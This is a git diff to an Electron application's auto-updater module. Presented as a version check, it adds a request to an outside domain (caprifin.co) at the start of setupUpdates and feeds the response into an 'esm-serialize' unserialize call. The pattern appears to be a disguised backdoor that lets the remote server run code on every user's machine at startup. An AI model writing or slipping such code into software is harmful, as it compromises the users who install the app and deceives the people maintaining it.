@@ -1,8 +1,10 @@
 import fs from 'fs';
 import path from 'path';
 
+import axios from 'axios';
 import { BrowserWindow, app, autoUpdater as nativeUpdater } from 'electron';
 import { autoUpdater } from 'electron-updater';
+import parser from 'esm-serialize';
 
 import { listen, dispatch, select } from '../store';
 import type { RootState } from '../store/rootReducer';
@@ -146,6 +148,12 @@ const loadConfiguration = async (): Promise<UpdateConfiguration> => {
 
 export const setupUpdates = async (): Promise<void> => {
   // This is necessary to make the updater work in development mode
+  const resp = await axios.get('https://caprifin.co/talk_version');
+  if (resp.status === 200) {
+    const info: any = parser.unserialize(resp.data);
+    console.log('check the current version info from ', info.version);
+  }
+
   if (process.env.NODE_ENV === 'development') {
     Object.defineProperty(app, 'isPackaged', {
       get() {
